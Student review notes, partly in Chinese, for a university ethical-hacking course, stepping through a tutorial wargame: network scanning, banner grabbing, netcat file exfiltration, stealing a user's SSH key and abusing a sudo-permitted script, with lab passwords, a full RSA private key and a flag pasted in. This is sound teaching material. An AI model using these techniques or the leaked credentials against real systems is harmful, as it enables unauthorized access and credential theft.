# Index
[toc]

# Map
This is the review notes for the course named Ethical Hacking at KTH. I have already deleted all specific clues for searching the exact flags(except the tutorial one)

# Environment
1. Linux Kali: downloaded from official website.
2. Cred: from Canvas.
3. VPN: run a script and it will start OpenVPN service. Put it in the same directory as the cred files.
4. If conflicts happen:
> Possible conflict between Kali Linux on Virtualbox and the course's network. This network by default will belong to the 10.0.2.0/24 subnet. This will conflict with the 10.0.0.0/20 range that we use in the course. To see if you have this issue, type `ip route` in a terminal and press enter.  
Example of solution:
```
sudo ip route add 10.0.0.0/24 via 192.168.0.1 dev tun_ethhak metric 1
sudo ip route add 10.0.2.0/24 via 192.168.0.1 dev tun_ethhak metric 1
sudo ip route del 10.0.2.2 dev eth0
```
The last line (10.0.2.2) that points directly to your laptop is as specific as it can be (/32 range) and it cannot be easily overridden. We have to delete it to be sure there is no conflict.

### ip route
Metric：
为路由指定所需跃点数的整数值（范围是 1 ~ 9999），它用来在路由表里的多个路由中选择与转发包中的目标地址最为匹配的路由。所选的路由具有最少的跃点数。跃点数能够反映跃点的数量、路径的速度、路径可靠性、路径吞吐量以及管理属性。
Metric的值越小，优先级越高。
如果两块网卡的Metric的值相同，就会出现抢占优先级继而网卡冲突，将会有一块网卡无法连接。  
————————————————  
版权声明：本文为CSDN博主「谁还不是小白鼠」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。  
原文链接：https://blog.csdn.net/memory6364/article/details/84826150
<!-- 
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ip route                          
default via 10.0.2.2 dev eth0 proto dhcp src 10.0.2.15 metric 100 
10.0.0.0/24 via 192.168.0.1 dev tun_ethhak metric 1 **
10.0.0.0/22 dev tun_ethhak scope link metric 1 **
10.0.0.0/22 via 192.168.0.1 dev tun_ethhak proto static metric 50 **
10.0.2.0/24 via 192.168.0.1 dev tun_ethhak metric 1 **
10.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15 metric 100 
10.0.4.0/22 via 192.168.0.1 dev tun_ethhak proto static metric 50**
192.168.0.0/24 dev tun_ethhak proto kernel scope link src 192.168.0.7 
                                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo ./vpn-connect.sh --disconnect                                   
[sudo] password for kali: 
Stopping any existing VPN connections
Stopped 1 connection(s)
                                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ ip route                          
default via 10.0.2.2 dev eth0 proto dhcp src 10.0.2.15 metric 100 
10.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15 metric 100 
                                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo ./vpn-connect.sh             
Starting VPN connection
2022-09-06 15:12:32 Note: Treating option '--ncp-ciphers' as  '--data-ciphers' (renamed in OpenVPN 2.5).
Warning: your routing table contains overlapping rules:
        10.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15 metric 100 
This means that you won't be able to reach those parts of the cyber range.
Please change the network of your virtual interface to be outside of 10.0.0.0/20.
Refer to the "VPN installation" page on Canvas for how to resolve the conflict.
VPN connection successful.
                                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ ip route             
default via 10.0.2.2 dev eth0 proto dhcp src 10.0.2.15 metric 100 
10.0.0.0/22 via 192.168.0.1 dev tun_ethhak **
10.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15 metric 100 
10.0.4.0/22 via 192.168.0.1 dev tun_ethhak **
192.168.0.0/24 dev tun_ethhak proto kernel scope link src 192.168.0.7 
``` -->


# Linux usage

`ping` also has meaning of just typing the link into the browser.

## level1
Type `ssh crash-course@10.0.2.233 -p 1337` and start a session. 
Type `ls` and see there is only one file.

- OpenVPN service
To recap what has happened so far, you first established a VPN
connection to the course environment. This means that traffic
destined for the cyber range will be encrypted and forwarded to
our VPN server, which will pass it along to systems such as this
one. With this setup, it is important to establish only 1
connection to our server and to terminate your connection.
For example, do not run the VPN connection script multiple times.
One easy method to terminate the connection is to execute 
'killall openvpn' in a terminal.

- Shell
On the topic of terminals, the second step was to connect to the
tutorial machine. This was achieved with a Secure SHell (SSH)
command designating the system user, IP address, and port number.
The shell is what you are interacting with right now.
Pragmatically, it is a text-based command line for interacting
with the operating system. The shell is mainly how you interact
with Linux systems, such as Kali Linux and Parrot OS, efficiently.
It is also how you will interact with many systems throughout the
course. The keyboard shortcut to bring up a terminal is usually
ctrl + alt + t or simply alt + t.

- dump the text from a file  
Finally, your shell interactions thus far involved opening this
text file. This likely involved the list command (ls) and the
'cat' command to dump the text to the terminal window. Other
likely commands were 'more' and 'less'. Perhaps you encountered
one of the text editors Vi, Vim, or Nano? Regardless, all are
valid solutions, and hacking is all about finding creative solutions.


## level2

- `echo $SHELL`   
The '$SHELL' part is an environment variable. Variables will be
addressed later in the tutorial. To start Bash, execute it like 
any other program with

- `/bin/bash`
You may also encounter the /bin/sh. Which shell
this starts depends on the system. For a typical Ubuntu
installation, it will likely be either Bash or Dash.

On the topic of execution, the previous level introduced some
rudimentary shell commands, such as ls. Further control is
exercised by working with command line parameters, often in one
of three styles

    - Unix style: a dash (-) followed by one or more letters.
      Example: ls -l, ls -l -a, ls -la. Be mindful of parameters
    expecting input, such as file names or port numbers, when
    concatenating.
    - GNU style: double dash (--) followed by words. Example: python
      --version.
    - BSD style: just letters. Example: ps l

- Many commands have intuitive shorthands as well, such as 
  - ls /path/to/directory
  - cat [FILE(s)]

To find out how to use a command, it is usually possible to pass
the help (-h) parameter. Alternatively, one can bring up the
detailed manual pages with the 'man' command. For example,
'man ls'. Commands and parameters such as file names and
directories can often be auto-completed. This is invoked by
pressing the tab key once. If auto-completion fails due to
multiple options, pressing the tab key twice lists the options.

Moving on to the current challenge. Central to hacking is
understanding permissions and access control. For files in Linux,
the basic permissions are designated as three triplets. They can
consist of
    - r: read
    - w: write
    - x: execute

Each triplet stands for the owner, group, and other users. For
example, the entry
    'rw-r--r--'

Stands for read + write for the file owner and read-only for the
rest. You can list permissions with 'ls -l'.

The challenge for this level is to navigate into the adjacent
level folder and somehow identify the file where you have read
access. Bash (execute '/bin/bash') will by default show which
directory you are in to the left of where you are typing.

```
$ echo $SHELL
/bin/sh
$ /bin/bash
level2@en2720-w11-hackstock:~$ ls
L2_files  ReadMe.txt
level2@en2720-w11-hackstock:~$ echo $SHELL
/bin/sh
level2@en2720-w11-hackstock:~$ cd L2_files/
level2@en2720-w11-hackstock:~/L2_files$ ls -l | grep level2
-rw-rw-r-- 1 level2 level2   28 Sep  5 05:24 750c5a056ed9ad25f0f243fe687d29f9b985d83a
level2@en2720-w11-hackstock:~/L2_files$ cat 750c5a056ed9ad25f0f243fe687d29f9b985d83a
level3
T0hmthk.2rqbJFDH8jIx
```

## level3

The previous levels introduced basic access permissions, opening
files, and navigating into different directories. On the topic of
navigation, it is high time to introduce the Linux file system.
Starting from the root (/), the file system is structured as such
- /bin/: basic programs.
- /boot/: files required for booting the system, such as Linux
  kernel files.
- /dev/: device files.
- /etc/: configuration files.
- /home/: user files (you are likely here.)
- /lib/: basic libraries.
- /media/: removable device mount point.
- /mnt/: temporary mount point.
- /opt/: extra third party applications.
- /run/: volatile runtime data.
- /sbin/: system programs.
- /srv/: data used by servers on the system.
- /tmp/: temporary files.
- /usr/: applications.
- /var/: variable data handled by daemons.
- /root/: system administrator files.

The course reading lists contain more information about this
standard setup: the Filesystem Hierarchy Standard (FHS).
The above breakdown was an excerpt from the Kali Linux Revealed
book (pp. 54-55). 

There are a number of ways to find your way around the system.
Commands can be located with the 'which' command, which will show
the install path of the program if it exists. Files can, on the 
one hand, be found with the 'locate' command. This queries an
internal database of system files and directories. A more dynamic
approach is to use the 'find' command.

When searching, either through systems or files themselves,
filtering output is very useful. A common command for such
purposes is 'grep'. A basic example is

'grep Hello "ReadMe.txt"'

Which searches for the text "Hello" in this file. However, a more
powerful usage is chaining grep with other commands. For example,

'ls | grep "ReadMe.txt"'

This command will pass the output of 'ls' to 'grep' via the pipe
operator (|). The list results will be filtered to only show
entries with this text file in it.

Moving on to the next challenge, there is a large collection of
text files planted somewhere on the system. Your task is first to
find them. Once found, only 1 file contains the next set of
credentials. Your clue for this task is 'ethhak'.

Here is a tip: copy-pasting in terminals requires ctrl+shift+c/v.
You can often paste by clicking the mouse scroll wheel as well,
including when text is only highlighted somewhere.

**在系统根目录操作，找出带关键词`ethhak`的文件夹，里面有大量含有ethhak的文件。去这些文件的内容里搜索下一个等级的内容。**
```
level3@en2720-w11-hackstock:/$ find . | grep ethhak

level3@en2720-w11-hackstock:cd /usr/local/etc/L3_files/

level3@en2720-w11-hackstock:.../etc/L3_files$ grep -rn level4 *
ethhak-a4b42b82882d2804555fc224cf4b8b14f2bcba656e61c8800c:2:level4
level3@en2720-w11-hackstock:.../etc/L3_files$ cat ethhak-a4b42b82882d2804555fc224cf4b8b14f2bcba656e61c8800c
ethhak
level4
me.opv.s0P-79Vxz9iVw
0d694e215948649769036d8b37ee4ad4ca0766e7407142
63a969b248562dfe004a7f83256b87bb4606902e534652ffdcfcda00aa1f
52b7da1c7889202361d6fa06d6429bde0aafab7e8c562f06f7bf
d20449822c48411fde6a205d63609a9b246b1c43d9b933f605b8dbb672f728990b231620f1531a8528
55dc33ce386a329bc00c2f2016c2116a6ae15f448afee950658bce
fd706b9f46683498c4d2788d18fe9baf8d481c28
03e5cb468d8b528ce1e02fec5e3d6eb4c92a848991cb8fa0542fea2ade6c22743b69bb7d
a0c3097fa528efc1ff23df40cfafad26420fcdac7e0bbcdeb97cf379
3bb27d98897f6dda2241e6d20d700fd1

```

## level4
There are numerous models for ethical hacking and penetration
testing. A simple one consists of the four phases

- Reconnaissance.
- Scanning/enumeration.
- Exploitation.
- Post-exploitation.

Reconnaissance entails finding information about your target
using any open information sources available, such as the Internet.
This is commonly referred to as using Open Source INTelligence
(OSINT) as well. There is not much of reconnaissance in this
course, except perhaps the free-form information searching.

Scanning and enumeration involve tools and techniques for
finding targets and finding out more about targets. This includes
finding machines on a network, what services they are running,
the software versions, machine operating systems, and so on.
These activities are vital to your further hacking endeavors.

The exploitation phase entails using whatever weaknesses you
identify to your advantage. Having turned off password
authentication is a weakness, but it is the act of using it for
some unintended purpose that defines exploitation. This is what
what many associate with hacking. However, it is not impossible
for the scanning, enumeration, and identifying the weakness itself
to constitute most of the hacking work.

The post-exploitation step refers to what you do once a system is
compromised. On the one hand, this can entail restarting the
process from reconnaissance or scanning/enumeration. If you have
gained access to a new network, a sensible step is to find out
more about what is now accessible to you. On the other hand, it
is also sensible to give yourself a shortcut or back door into
the compromised system. Such tools and techniques also fall within
post-exploitation.

Rewinding to scanning and enumeration, a fundamental technique is
banner grabbing. Simply put, this means connecting to a network
service on a port and reading the information it returns. This
will often indicate what is running there, version numbers, and
so on.

A common tool for banner grabbing is Netcat (nc), the TCP/IP Swiss
army knife. While Netcat can do much more, banner grabbing is as
simple as connecting to a system on a specific port. To stop
Netcat, and many other commands, the shortcut is ctrl+c to send
an interrupt.

This challenge is straightforward. The password for the next user
is the entire banner of the SSH service on this system. The
username is given below.

level5

## level5

The reason for banner grabbing is that information such as
operating systems, services running, and version numbers are
vital for proceeding with hacking. It determines how you can
interact with a system. This, in turn, determine your options as
a hacker. Moreover, it tells you what you need to know about to
begin hacking a system as well. A helpful mantra for hacking is

Scan, scan, scan.
Enumerate, enumerate, enumerate.

It bears repeating: a lot of hacking comes down to knowing what
you are dealing with and how to deal with it. As far as banner
grabbing goes, Netcat can do the job for a few select services.
Perhaps even many services with the help of some scripting.

Somewhat similar to Netcat is Curl, which can be used for banner
grabbing as well. However, its primary usage is to communicate
with web services via protocols such as HTTP(s) and FTP via the
command line. In a similar vein, Wget is a convenient tool for
downloading content from the web via the command line.

When it comes to scanning and enumeration on networks, there are
already well-established tools available, such as Network Mapper
(nmap). Nmap can probe machines for listening services, grab
banners, sometimes probe services for more information, and even
scan for known vulnerabilities to some extent. It is a handy tool
for initial network scanning and enumeration.

Moving to the challenge at hand, try scanning this tutorial machine
from the inside (localhost or 127.0.0.1) with nmap from this user
account. Nmap should already be installed. See if something
interesting shows up. The -p parameter might be helpful for
designating port intervals.

```
level5@en2720-w11-hackstock:~$ nmap localhost -p 1-65535

Starting Nmap 7.60 ( https://nmap.org ) at 2022-09-10 10:17 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00014s latency).
rDNS record for 127.0.0.1: localhost.localdomain
Not shown: 65528 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste
2720/tcp open  wkars
2721/tcp open  smart-diagnose
2722/tcp open  proactivesrvr
2723/tcp open  watchdog-nt
2724/tcp open  qotps

Nmap done: 1 IP address (1 host up) scanned in 13.52 seconds

level5@en2720-w11-hackstock:~$ nc -nv 127.0.0.1 2723
Connection to 127.0.0.1 2723 port [tcp/*] succeeded!
level6
RNEdWBPavTFpmlja6_HC

level5@en2720-w11-hackstock:~$ nmap localhost -p 2723 --script banner

Starting Nmap 7.60 ( https://nmap.org ) at 2022-09-10 10:18 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00013s latency).
rDNS record for 127.0.0.1: localhost.localdomain

PORT     STATE SERVICE
2723/tcp open  watchdog-nt
|_banner: level6\x0ARNEdWBPavTFpmlja6_HC

Nmap done: 1 IP address (1 host up) scanned in 3.25 seconds
```
注意nmap和nc打印出来的banner的编码方式不一样，换行符\x0A不是密码。

## level6


Welcome to level6!

Having seen nmap in action, remember to scan in moderation during
the course. Recall that the VPN setup tunnels traffic through
our server. Network scanning can be intensive. Therefore, avoid
scanning, say, more than 255 hosts at a time in the course IP
range. Moreover, be careful with the 'Pn' parameter in nmap. Only
use it for specific hosts as it generates a lot of traffic.

While reminiscing, do you also recall the pipe (|) operator from
earlier? Piping is part of Input/Output redirection, or command
chaining, in Linux. The pipe takes the standard output from one
command and funnels it as standard input to the next.

Additional output redirection operators are > and >>. The single > 
will write the standard output of a command as a file, for
example

'ls > myList.txt'

The >> operator works similarly but appends the output to the end
of an existing file.

For input redirection, the opposite < is used. This can, for
example, have a command read the contents of a file. For example

'cat < hello.txt'

would (albeit somewhat redundant) print the contents of the
hello.txt file to the terminal. The corresponding << feeds
input to commands until a specified delimiter is encountered.
For example

cat << EndHere
Line 1
Line 2
EndHere

would print

Line1
Line2

The reason for bringing up all these redirection operators is to
discuss file uploads and downloads. Netcat is, in addition to
banner grabbing, a very handy tool for basic transfers. If Netcat
is instructed to listen (-l) on a system as such

'nc -l -p 1337 < someFile.txt'

Then connecting to port 1337 with another Netcat

'nc 127.0.0.1 1337 >newFile.txt'

Would result in someFile.txt being downloaded and saved as
newFile.txt. As for what you transfer, it could be just about
anything. For example, interesting files found while hacking or
maybe your code (or why not these text files?) It is worth
noting that Netcat transfers might require some additional work
for larger and more complicated files.  It might be easier to use
SCP or some other dedicated file transmission tool in such cases.

Curl and Wget were mentioned for interacting with web services
earlier. Another trick is to serve up files from your system using
the Python Simple HTTP server. Then, you can download files
from that server, which could be your system, for example.

On the topic of transfers, the task for this level is now to
exfiltrate the image file found under this home directory. The
username for the next level is

level7


## level7
Welcome to level7!

Having covered Input/Output redirection, a brief foray into jobs
is now relevant. If you are very new to working with the command
line, this might feel somewhat overwhelming. However, it will be
very useful to remember when you have built up some familiarity
with the basics later on.

Jobs enable us to run multiple processes in parallel from the
same terminal window. To list running jobs, simply execute
'jobs'. To run a command in parallel, append an ampersand (&) to
the end of a command, for example

'nc -lp 1337 &'

The above Netcat listener would run in the background. To bring
it to the foreground and interact with it directly, use
'fg <ID>'. The ID is found using 'jobs'. The command for
backgrounding is 'bg'. 

Recall that ctrl+c sent an interrupt signal. Similarly, pausing
the current process, and resuming with fg, can be achieved with
ctrl+z, which sends a suspend signal. Signals are a way to control
processes and, therefore, parallel jobs. The exnplicit command is
'signal' and requires a process ID and a numeric signal ID.
Running processes can be listed with 'ps', often combined with
'-aux' or '--forest'. The commands 'top' and 'htop' are sometimes
available for viewing running processes. Another method for managing
services is 'systemctl'. This can, for example, be used to start,
stop, restart, and show the status of a running service.

Switching over to SSH, the tutorial has so far relied on
passwords. While convenient, passwords often leave things to be
desired security-wise. Therefore, the tutorial will now upgrade
to using cryptographic keys for SSH access.

Very briefly, SSH makes use of a pair of keys. There is 1 public
key and 1 corresponding private key. As the names suggest, the
public key can be distributed to the public. The private key
should be kept secret and protected.

When setting up SSH access to a machine, SSH will consult a list
of authorized public keys for a particular user. Only someone
carrying the corresponding private key will be granted access.
In principle, this is how such keys are used outside of logins as well.
Specifically, this many-to-one relationship between keys is the
cornerstone of asymmetric cryptography. This runs counter to
the more intuitive symmetric one-to-one relationship. That is,
the same key is used by all parties, akin to a door key. This topic
goes much deeper than what can be covered here, but know that
a private key can be a grand prize, not just for login access.

The SSH keys for a system can often be found in a hidden
directory under the /home/ folder for the specific user. Hidden
directories in Linux are denoted simply by a dot. They can be
viewed with ls by passing -a. SSH keys are typically two separate
files, one with a .pub extension and one without any extension.

For this level, navigate into the /home/ directory of the next
user and steal their SSH keys. Note that private keys must only
be accessible by the file owner. If you download the key to your
system, the access rights for your copy can be modified with the
'chmod' command (remember the rwx triples?)


* Question: chmod:
```
└─$ ls -l    
total 4
-rw-r--r-- 1 kali kali 3243 Sep 10 08:47 id_rsa

└─$ ls -l
total 24
-rw------- 1 kali kali  399 Sep  6 13:32 id_ed25519
-rw-r--r-- 1 kali kali   91 Sep  6 13:32 id_ed25519.pub
-rwxr-xr-x 1 kali kali 3243 Sep 10 08:47 id_rsa_level8
-rw-r--r-- 1 kali kali  724 Sep 10 20:38 id_rsa_level8.pub
-rw------- 1 kali kali  648 Sep  8 07:24 known_hosts
-rw-r--r-- 1 kali kali  142 Sep  6 13:07 known_hosts.old


└─$ ssh level8@10.0.2.233 -p 1337    
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0755 for '/home/kali/.ssh/id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "/home/kali/.ssh/id_rsa": bad permissions
level8@10.0.2.233's password: 


└─$ chmod 600 id_rsa    

└─$ ls -la | grep id_rsa
-rw-------  1 kali kali 3243 Sep 10 08:47 id_rsa
-rw-r--r--  1 kali kali  724 Sep 10 20:38 id_rsa.pub
```


## level8
Welcome to level8!

Before proceeding, here is a recap on the key pair concept yet
again:

- Public keys: not secret, can be distributed.
- Private keys: keep secret and protected.

A crucial aspect of these asymmetric cryptographic keys is that
the public key can determine if someone has the private key.
Furthermore, if the public key is used, for example, to send
something. Then, in principle, only the private key holder can
retrieve it. For SSH logins, the server only needs the public keys
listed in an authorized_keys file (default) to grant access to
whoever holds the protected private key.

On the topic of gaining access, there is one grand prize on every
machine. To truly pwn a machine, you need to obtain root access.
This is the system administrator access, essentially allowing you to
do whatever you wish on that system.

You do not drop into Linux systems as root by default. To elevate
privileges for a specific command when necessary, precede it with
'sudo'. If you are, for example, running a virtual machine, you likely
have unlimited access to root privileges. However, there are
times when users are only allowed to run specific commands with
elevated privileges. These settings can be listed by passing -l to
sudo.

Creating a root access shell can be achieved with 'sudo su'. The
'su' command stands for Substitute User and can also be used for
logging in as another regular user.

As mentioned, elevating (or escalating) your privileges to root
is how to pwn a machine. Realistically, this can be done in many
ways, and finding the specific system weakness can be like looking
for the needle in the haystack. Scanning and enumeration are once
again key.

Given everything above, how about checking if there are some root
privileges to exploit?

```
level8@en2720-w11-hackstock:~$ sudo -l
Matching Defaults entries for level8 on en2720-w11-hackstock:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User level8 may run the following commands on en2720-w11-hackstock:
    (ALL : ALL) !ALL
    (root) NOPASSWD: /home/level8/tutorial_script.sh
    
level8@en2720-w11-hackstock:~$ ./tutorial_script.sh 
cat: /home/the-end/.ssh/id_rsa: Permission denied
Echoing as level8
level8@en2720-w11-hackstock:~$ sudo ./tutorial_script.sh 
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
Echoing as root
```

Copy the above key. 
One problem is that I copied the id_rsa.pub file before; if I directly replace the content in the id_rsa file, it won't work when I try to ssh the-end user.

```
the-end@en2720-w11-hackstock:~$ ReadMe.txt
"To secure ourselves against defeat lies in our own hands, but
the opportunity of defeating the enemy is provided by the enemy
himself."

Welcome to the end of the tutorial!

If you see this, then you should have successfully pwned
the tutorial machine. Congratulations!

It is a bit anti-climactic for a hacking tutorial to not end in
root privileges, but the exploit itself was not as contrived as
it might have seemed. Delegating too many privileges or tricking
privileged processes into working for you are two viable
escalation tactics. Just imagine if that script could return a
file of your choosing or execute your code instead! There will be
machines to pwn properly throughout the course, so don't worry.

Some final words of caution is in order. Gaining access to a system,
especially root access, gives much power. This brings up the
topic of operational security. Like how you in the real
world likely would not want to bring down systems willy nilly,
you should strive to avoid such incidents here. If you by
accident bring down a system, follow the reporting procedures on
Canvas. Similarly, you should not deliberately disrupt challenges
for others, for example, by leaving files lingering on the system.
Discovered failures of this nature can lead to point deductions,
depending on the circumstances.

There might be times when you encounter a bottleneck in the
course. That is, when two or more students attempt the same
challenge and end up interrupting one another somehow. In these
events, the 'who' command can be utilized to see other logged
users. Furthermore, the 'wall' command can be used to coordinate
your attempts respectfully.

All that remains now is some advice before taking on the rest
of the cyber range. The first is to stay somewhat organized. You
will encounter many IP addresses, port numbers, version numbers,
handy one-liners, and so on. There is too much to remember, so do
take notes.

Furthermore, keep in mind that this is a problem-based course.
This tutorial has much handholding, but you are generally left to
your own devices in the course. The course poses problems, and
you are graded on your ability to solve them independently.
Solving them, in this case, means hacking. Once you solve a
challenge, you can find a flag that you hand in for points.

On the topic of hacking, while it can be a thrilling and
stimulating experience, it is more often than not a
time-consuming, highly frustrating, and dull experience.
Hacking is neither easy nor user-friendly. It is actually
the opposite. Your attempts may fail without any indicators
of why. Your connections may be unstable and drop
without warning. A typo may be responsible for hours of
failed attempts.

When dealing with frustration, the first suggestion might be to
take a break. Not only to preserve your sanity and good spirits
but also because it can help you spot simple mistakes or provide
a fresher look on the problem. Also, keep in mind that trial, error,
analysis, and correction are very often excellent grounds for
learning. So take the opportunity to learn. When things do not work,
learn about the underlying technology, tools, and methods. It may
help you better understand the problem.

So, where to next? There are a few sources to keep in mind while
tackling the various challenges in the course

- The flag dependencies and hint guide on Canvas.
- The suggested reading announcements posted throughout the
  course.
- The course videos on Canvas.
- The basic readings page.
- The ordinary readings page.
- The video list page on various tools.
- The World Wide Web.
- Your search engine of choice (do not underestimate this one)

For a more immediate suggestion, why not look at the HackTheBox
Popcorn walkthrough from the essentials page? Seeing the process
can be helpful but do not expect the exact same hacks to work!

If nothing else, remember to

Scan, scan, scan.

Enumerate, enumerate, enumerate.

Happy hacking!


the-end@en2720-w11-hackstock:~$ cat goal.txt
Skill to do comes of doing;
knowledge comes by eyes always open, and working hands; 
and there is no knowledge that is not power.

flag{155d78a0c326eccc546bd9390e133535991f98351686fd}
```


## 扫描与爆破

### nmap
Search hosts within the network zone 10.0.0.0-10.0.15.254

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap 10.0.0.0/20 -p 80 --open
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-15 20:32 EDT
Nmap scan report for 10.0.2.88
Host is up (0.052s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 10.0.2.164
Host is up (0.037s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 10.0.3.107
Host is up (0.100s latency).

PORT   STATE SERVICE
